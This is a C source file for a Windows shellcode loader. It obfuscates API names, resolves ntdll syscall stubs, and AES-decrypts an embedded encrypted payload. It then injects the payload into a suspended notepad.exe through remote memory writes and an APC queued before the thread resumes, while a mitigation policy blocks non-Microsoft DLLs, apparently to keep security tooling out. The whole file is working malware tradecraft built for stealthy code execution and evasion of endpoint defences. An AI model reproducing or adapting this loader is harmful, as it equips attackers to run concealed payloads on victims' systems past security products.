#include <windows.h>
#include <stdio.h>
//#include <winternl.h>
#include "syscalls.h"
#include <tlhelp32.h>

DWORD wNtAllocateVirtualMemory;
UINT_PTR sysAddrNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
UINT_PTR sysAddrNtCreateThreadEx;
DWORD wNtSuspendThread;
UINT_PTR sysAddrNtSuspendThread;
DWORD wNtResumeThread;
UINT_PTR sysAddrNtResumeThread;
DWORD wNtOpenProcess;
UINT_PTR sysAddrNtOpenProcess;
DWORD wNtProtectVirtualMemory;
UINT_PTR sysAddrNtProtectVirtualMemory;
DWORD wNtCreateProcess;
UINT_PTR sysAddrNtCreateProcess;
DWORD wNtQueueApcThread;
UINT_PTR sysAddrNtQueueApcThread;
//DWORD wNtUnmapViewOfSection;
//UINT_PTR sysAddrNtUnmapViewOfSection;

char* getoriginal(int offsets[], char* big_string, int sizeof_offset) {
    // Calculate the number of elements in the offsets array
    int num_offsets = sizeof_offset / sizeof(int);

    // Dynamically allocate memory for the resulting string
    char* result = (char*)malloc(num_offsets + 1); // +1 for the null terminator
    if (!result) {
        perror("Failed to allocate memory");
        return NULL;
    }

    // Build the resulting string
    for (int i = 0; i < num_offsets; ++i) {
        result[i] = big_string[offsets[i]];
    }

    // Null-terminate the string
    result[num_offsets] = '\0';

    return result;
}

void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coolcode, &coolcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}



int main(int argc, char* argv[]) {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";


    unsigned char AESkey[] = { 0x19, 0x11, 0x19, 0x31, 0x63, 0xb7, 0xdd, 0xe9, 0xdf, 0xa8, 0x98, 0x29, 0x67, 0x18, 0x6b, 0x2b };
    unsigned char AESshellcode[] = { 0xa0, 0x7, 0xd2, 0xe9, 0xd3, 0xe2, 0xc, 0x8f, 0xc5, 0x6f, 0x98, 0x1e, 0xea, 0x72, 0x3e, 0xd9, 0x12, 0x12, 0xbf, 0x9c, 0x56, 0x25, 0x79, 0x29, 0xf1, 0x74, 0xc5, 0x19, 0x4f, 0x38, 0x8f, 0x2e, 0xbc, 0xbd, 0x14, 0xd5, 0xf0, 0x50, 0xd6, 0x3a, 0x2b, 0x35, 0xb0, 0x77, 0xc3, 0xb3, 0xe4, 0x74, 0xa8, 0x3b, 0x83, 0x82, 0xf6, 0xb5, 0xef, 0xae, 0x12, 0xed, 0xdd, 0x71, 0xac, 0x74, 0x42, 0xf3, 0x4d, 0xd3, 0xd8, 0xf4, 0x2b, 0x62, 0xb8, 0x6c, 0xb1, 0x51, 0x36, 0x35, 0xf6, 0x36, 0x53, 0x3a, 0x52, 0x97, 0xf5, 0x1d, 0x50, 0xe1, 0xe2, 0xa8, 0x95, 0xd8, 0x95, 0x87, 0x3d, 0x61, 0x3d, 0x4, 0x84, 0x9a, 0x9c, 0xa0, 0x24, 0x4b, 0xcd, 0xe4, 0xf0, 0x3f, 0x73, 0x4b, 0x80, 0xd, 0xc4, 0xfd, 0xdf, 0x88, 0x92, 0xae, 0x7, 0x99, 0x96, 0x28, 0x76, 0xae, 0xbc, 0x6e, 0x21, 0xa1, 0x24, 0x2, 0xf8, 0xb0, 0x5b, 0xfc, 0xbb, 0x41, 0x3, 0x8a, 0x5a, 0x1b, 0x4a, 0x7e, 0x5e, 0x96, 0xed, 0x59, 0xfd, 0xba, 0x4d, 0x75, 0x45, 0x42, 0x14, 0xe1, 0x10, 0x5a, 0xc3, 0x3a, 0x41, 0x9e, 0x64, 0xba, 0xd, 0x7, 0xdf, 0x61, 0x6e, 0x81, 0xb7, 0xbc, 0xfb, 0x99, 0x4b, 0xf1, 0x42, 0xab, 0x8, 0xa9, 0x55, 0xa1, 0x96, 0xc2, 0x1a, 0xf3, 0xb5, 0x90, 0xc, 0xaf, 0xa4, 0x34, 0x59, 0x16, 0x4d, 0x4, 0x21, 0xc8, 0xfe, 0xfc, 0x30, 0x5f, 0xf3, 0xaf, 0x97, 0x3e, 0x97, 0xf, 0xbe, 0x82, 0x54, 0x68, 0xf1, 0xda, 0x49, 0x7a, 0xb5, 0x45, 0x9e, 0xcd, 0x9, 0xa7, 0xe6, 0xc0, 0xf3, 0x32, 0x36, 0x34, 0x5f, 0x14, 0x2c, 0xd5, 0x4c, 0x5c, 0xf3, 0x24, 0xc2, 0xdd, 0xe, 0x94, 0x2b, 0x6f, 0x26, 0x2d, 0xfb, 0x12, 0x19, 0x9c, 0xdf, 0x1b, 0x0, 0xb9, 0x64, 0xa4, 0xe4, 0xa4, 0x7, 0xe3, 0x31, 0xd4, 0x35, 0x91, 0x10, 0x6c, 0xd1, 0x30, 0x10, 0x4, 0xfb, 0x56, 0x73, 0x57, 0xee, 0xa, 0x91, 0x1d, 0x59, 0x62, 0xea, 0x50, 0x9d, 0x8e, 0xd, 0x52, 0x6, 0xca, 0xc4, 0x66, 0xb2, 0x4f, 0x45, 0x98, 0x69, 0x36, 0xf9, 0xc7, 0x34, 0x19, 0x3c, 0x80, 0xbf, 0xa4, 0xa4, 0x14, 0xbd, 0x23, 0xbd, 0x21, 0x87, 0xb7, 0x6d, 0x1d, 0x10, 0x1e, 0x1c, 0xbf, 0x9, 0x5e, 0xcc, 0x5, 0x83, 0xd2, 0x59, 0xbc, 0xf4, 0xa1, 0xf, 0x4a, 0xab, 0xb1, 0xf2, 0xf7, 0xb1, 0xb9, 0xea, 0x59, 0xda, 0x3a, 0xc6, 0xef, 0x80, 0x68, 0xc0, 0x49, 0x3c, 0xbb, 0x49, 0x6e, 0x23, 0x77, 0xa5, 0x4b, 0x39, 0x67, 0x5e, 0x95, 0x33, 0xd5, 0x80, 0xf3, 0xf5, 0x8a, 0x72, 0x5d, 0x8f, 0x43, 0xef, 0xf3, 0xb2, 0x96, 0xf0, 0x99, 0xbc, 0xa9, 0x15, 0x61, 0x15, 0x3b, 0xe1, 0x19, 0x76, 0xdf, 0x31, 0x8f, 0xf6, 0x32, 0x8f, 0xa1, 0xec, 0xed, 0x15, 0x97, 0xbc, 0x36, 0xa, 0x62, 0xaf, 0xc8, 0xd7, 0x4b, 0x7b, 0x47, 0x74, 0x3, 0x3d, 0x4f, 0x6f, 0xe5, 0x5f, 0x13, 0xea, 0x6d, 0x41, 0x70, 0x95, 0xad, 0x42, 0xc8, 0x40, 0x9f, 0x8d, 0x7, 0x27, 0xff, 0xc1, 0x82, 0x24, 0x2b, 0x60, 0xde, 0x7f, 0xe0, 0xc9, 0x40, 0xef, 0x98, 0xa4, 0x8a, 0xa5, 0xe3, 0xe7, 0x3f, 0xce, 0x3d, 0xd4, 0x47, 0x6, 0xc5, 0x56, 0x42, 0xb1, 0x8f, 0x7, 0xd0, 0x22, 0x3f, 0xa7, 0xc9, 0xf5, 0x44, 0xe5, 0xc4, 0xc3, 0x38, 0x46, 0xca, 0x77, 0x60 };
    
    SIZE_T shellcodeSize = sizeof(AESshellcode);
    //Get a handle to the ntdll.dll library
    //hello
    int ntt[] = { 13, 19, 3, 11, 11, 62, 3, 11, 11 };
    HMODULE hNtdll = GetModuleHandleA(getoriginal(ntt, big_string, sizeof(ntt)));

    int ntalloc_mem[] = { 39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    // Get the address of the NtAllocateVirtualMemory function
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntalloc_mem, big_string, sizeof(ntalloc_mem)));
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

    int ntwrite_mem[] = { 39, 19, 48, 17, 8, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24 };
    // Get the address of NtWriteVirtualMemory
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntwrite_mem, big_string, sizeof(ntwrite_mem)));
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

    int ntcre_thre[] = { 39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23 };
    // Get the address of NtCreateThreadE
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, getoriginal(ntcre_thre, big_string, sizeof(ntcre_thre)));
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;

    // Get the address of NtSuspendThread
    UINT_PTR pNtSuspendThread = (UINT_PTR)GetProcAddress(hNtdll, "NtSuspendThread");
    wNtSuspendThread = ((unsigned char*)(pNtSuspendThread + 4))[0];
    sysAddrNtSuspendThread = pNtSuspendThread + 0x12;

    // Get the address of NtResumeThread
    UINT_PTR pNtResumeThread = (UINT_PTR)GetProcAddress(hNtdll, "NtResumeThread");
    wNtResumeThread = ((unsigned char*)(pNtResumeThread + 4))[0];
    sysAddrNtResumeThread = pNtResumeThread + 0x12;


    // Get the address of NtSetContextThread

    UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(hNtdll, "NtOpenProcess");
    wNtOpenProcess = ((unsigned char*)(pNtOpenProcess + 4))[0];
    sysAddrNtOpenProcess = pNtOpenProcess + 0x12;

    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    wNtProtectVirtualMemory = ((unsigned char*)(pNtProtectVirtualMemory + 4))[0];
    sysAddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;

    UINT_PTR pNtCreateProcess = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateProcess");
    wNtCreateProcess = ((unsigned char*)(pNtCreateProcess + 4))[0];
    sysAddrNtCreateProcess = pNtCreateProcess + 0x12;

    UINT_PTR pNtQueueApcThread = (UINT_PTR)GetProcAddress(hNtdll, "NtQueueApcThread");
    wNtQueueApcThread = ((unsigned char*)(pNtQueueApcThread + 4))[0];
    sysAddrNtQueueApcThread = pNtQueueApcThread + 0x12;


    // Create a suspended process (notepad.exe)
    //STARTUPINFOA si = { 0 };
    //PROCESS_INFORMATION pi = { 0 };
    //si.cb = sizeof(si);
    //this is notepa full path

    //const char* targetProcess = "explorer.exe";

    //const wchar_t* targetProcess = L"explorer.exe";

    //SIZE_T size = sizeof(AESshellcode);

    // Locate the target process by name
    //int id = atoi(argv[1]);

    STARTUPINFOEX si = { 0 };  // Changed to STARTUPINFOEX
    PROCESS_INFORMATION pi = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEX); // Corrected the member reference

    SIZE_T attributeSize = 0;

    // Initialize process thread attributes
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);

    DWORD policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Using lpAttributeList for STARTUPINFOEX
    si.lpAttributeList = attributes;

    // Create process in suspended state with attribute list (e.g., mitigation policy)
    if (!CreateProcessA((LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&si, &pi)) {
        printf("[-] Failed to create process\n");
        return 1;
    }

    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    //PVOID remoteMemory = NULL;
    // Allocate memory in the remote process using VirtualAllocEx
    //NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    PVOID remoteMemory = VirtualAllocExNuma(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);


    aedecok((char*)AESshellcode, sizeof(AESshellcode), AESkey, sizeof(AESkey));

    // Write the shellcode into the allocated remote memory
    SIZE_T bytesWritten;
    


    NTSTATUS status = NtWriteVirtualMemory(hProcess, remoteMemory, AESshellcode, shellcodeSize, &bytesWritten);
    //status = NtWriteVirtualMemory(hProcess, remoteMemory, AESshellcode, shellcodeSize, &bytesWritten);


    // Change the memory protection in the remote process (to executable)
    DWORD oldProtect;
    


    status = NtProtectVirtualMemory(hProcess, &remoteMemory, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);


    // Queue an APC to execute the shellcode in the remote process
    


    // Queue the APC for remote execution (will invoke the shellcode)
    status = NtQueueApcThread(hThread, (PVOID)remoteMemory, NULL, NULL, NULL);

    
    // Resume the remote thread, which will execute the APC
    ULONG previousSuspendCount;
    status = NtResumeThread(hThread, &previousSuspendCount);

    return 0;
}
